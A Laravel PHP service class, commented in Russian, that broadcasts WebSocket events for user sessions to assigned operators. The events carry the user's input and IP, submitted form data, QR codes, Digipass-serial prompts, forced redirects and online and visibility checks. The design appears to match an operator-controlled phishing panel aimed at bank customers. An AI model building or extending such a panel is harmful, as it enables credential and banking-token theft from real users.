<?php

declare(strict_types=1);

namespace App\Services;

use App\DTOs\SessionDTO;
use App\Enums\ActionType;
use App\Models\Session;
use Illuminate\Support\Facades\Log;

/**
 * Сервис для работы с WebSocket broadcasting (Laravel Reverb)
 */
class WebSocketService
{
    /**
     * Broadcast события о создании сессии
     */
    public function broadcastSessionCreated(Session $session): void
    {
        $this->broadcast('admin', 'session.created', [
            'session_id' => $session->id,
            'input_type' => $session->input_type->value,
            'input_value' => $session->input_value,
            'ip' => $session->ip,
            'status' => $session->status->value,
            'created_at' => $session->created_at->toISOString(),
        ]);
    }

    /**
     * Broadcast события о назначении админа
     */
    public function broadcastSessionAssigned(Session $session): void
    {
        // На канал сессии
        $this->broadcast("session.{$session->id}", 'session.assigned', [
            'session_id' => $session->id,
            'admin_id' => $session->admin_id,
            'admin_username' => $session->admin?->username,
            'assigned_at' => now()->toISOString(),
        ]);

        // На общий канал админов
        $this->broadcast('admin', 'session.assigned', [
            'session_id' => $session->id,
            'admin_id' => $session->admin_id,
        ]);
    }

    /**
     * Broadcast события об откреплении админа
     */
    public function broadcastSessionUnassigned(Session $session, int $previousAdminId): void
    {
        // На канал сессии
        $this->broadcast("session.{$session->id}", 'session.unassigned', [
            'session_id' => $session->id,
            'admin_id' => $previousAdminId,
            'unassigned_at' => now()->toISOString(),
        ]);

        // На общий канал админов
        $this->broadcast('admin', 'session.unassigned', [
            'session_id' => $session->id,
        ]);
    }

    /**
     * Broadcast события о выборе действия (редирект пользователя)
     */
    public function broadcastActionSelected(Session $session, ActionType $actionType): void
    {
        $eventName = "action.{$actionType->value}";
        
        // Для REDIRECT используем внешний URL из сессии, для остальных — внутренний путь
        $redirectUrl = $actionType === ActionType::REDIRECT && $session->redirect_url
            ? $session->redirect_url
            : $actionType->getRedirectPath($session->id);

        $this->broadcast("session.{$session->id}", $eventName, [
            'session_id' => $session->id,
            'action_type' => $actionType->value,
            'admin_id' => $session->admin_id,
            'redirect_url' => $redirectUrl,
            'timestamp' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast события об отправке формы
     */
    public function broadcastFormSubmitted(Session $session, string $actionType, array $data = []): void
    {
        // На канал сессии
        $this->broadcast("session.{$session->id}", 'data.submitted', [
            'session_id' => $session->id,
            'action_type' => $actionType,
            'submitted_at' => now()->toISOString(),
        ]);

        // На канал админа (если назначен)
        if ($session->admin_id) {
            $this->broadcast("admin.{$session->admin_id}", 'admin.session.updated', [
                'session_id' => $session->id,
                'action_type' => $actionType,
                'changes' => $data,
                'updated_at' => now()->toISOString(),
            ]);
        }
    }

    /**
     * Broadcast события о завершении сессии
     */
    public function broadcastSessionCompleted(Session $session): void
    {
        $this->broadcast("session.{$session->id}", 'session.completed', [
            'session_id' => $session->id,
            'admin_id' => $session->admin_id,
            'completed_at' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast события об отмене сессии
     */
    public function broadcastSessionCancelled(Session $session, ?string $reason = null): void
    {
        $this->broadcast("session.{$session->id}", 'session.cancelled', [
            'session_id' => $session->id,
            'reason' => $reason,
            'cancelled_at' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast QR-кода на канал сессии
     */
    public function broadcastQrCode(Session $session, string $qrImage): void
    {
        $this->broadcast("session.{$session->id}", 'action.qr_code', [
            'session_id' => $session->id,
            'qr_image' => $qrImage,
            'timestamp' => now()->toISOString(),
        ]);
    }

    public function broadcastDigipassSerial(Session $session): void
    {
        $this->broadcast("session.{$session->id}", 'action.digipass-serial', [
            'session_id' => $session->id,
            'timestamp' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast проверки онлайн статуса
     */
    public function broadcastOnlineCheck(Session $session): void
    {
        $this->broadcast("session.{$session->id}", 'action.online.check', [
            'session_id' => $session->id,
            'admin_id' => $session->admin_id,
            'timestamp' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast результата проверки онлайн статуса
     */
    public function broadcastOnlineStatus(Session $session, bool $isOnline): void
    {
        // На канал сессии
        $this->broadcast("session.{$session->id}", 'action.online.status', [
            'session_id' => $session->id,
            'is_online' => $isOnline,
            'checked_at' => now()->toISOString(),
        ]);

        // На канал админа
        if ($session->admin_id) {
            $this->broadcast("admin.{$session->admin_id}", 'action.online.status', [
                'session_id' => $session->id,
                'is_online' => $isOnline,
                'checked_at' => now()->toISOString(),
            ]);
        }
    }

    /**
     * Broadcast изменения видимости пользователя
     */
    public function broadcastUserVisibility(Session $session, bool $isOnline, string $visibility): void
    {
        $data = [
            'session_id' => $session->id,
            'is_online' => $isOnline,
            'visibility' => $visibility,
            'timestamp' => now()->toISOString(),
        ];

        $this->broadcast("session.{$session->id}", 'user.visibility', $data);

        if ($session->admin_id) {
            $this->broadcast("admin.{$session->admin_id}", 'user.visibility', $data);
        }
    }

    /**
     * Broadcast пинга сессии
     */
    public function broadcastSessionPing(Session $session): void
    {
        $this->broadcast("session.{$session->id}", 'session.ping', [
            'session_id' => $session->id,
            'timestamp' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast ответа на запрос статуса сессии
     */
    public function broadcastSessionStatus(Session $session): void
    {
        $dto = SessionDTO::fromModel($session);

        $this->broadcast("session.{$session->id}", 'session.status.response', [
            'session_id' => $session->id,
            'status' => $dto->status->value,
            'action_type' => $dto->actionType?->value,
            'current_url' => $dto->getCurrentActionUrl(),
            'is_active' => $dto->isActive(),
            'redirect_url' => $dto->getCurrentActionUrl(),
        ]);
    }

    /**
     * Broadcast личного уведомления админу
     */
    public function broadcastAdminNotification(int $adminId, string $type, string $message, array $data = []): void
    {
        $this->broadcast("admin.{$adminId}", 'admin.notification', [
            'admin_id' => $adminId,
            'type' => $type,
            'message' => $message,
            'data' => $data,
            'timestamp' => now()->toISOString(),
        ]);
    }

    /**
     * Broadcast о новой сессии всем админам
     */
    public function broadcastNewSessionToAdmins(Session $session): void
    {
        $this->broadcast('admin', 'admin.session.new', [
            'session_id' => $session->id,
            'session_data' => SessionDTO::fromModel($session)->toArray(),
        ]);
    }

    /**
     * Базовый метод broadcast
     */
    private function broadcast(string $channel, string $event, array $data): void
    {
        try {
            broadcast(new \App\Events\GenericBroadcastEvent($channel, $event, $data));
        } catch (\Throwable $e) {
            Log::error("WebSocket broadcast failed", [
                'channel' => $channel,
                'event' => $event,
                'error' => $e->getMessage(),
            ]);
        }
    }
}
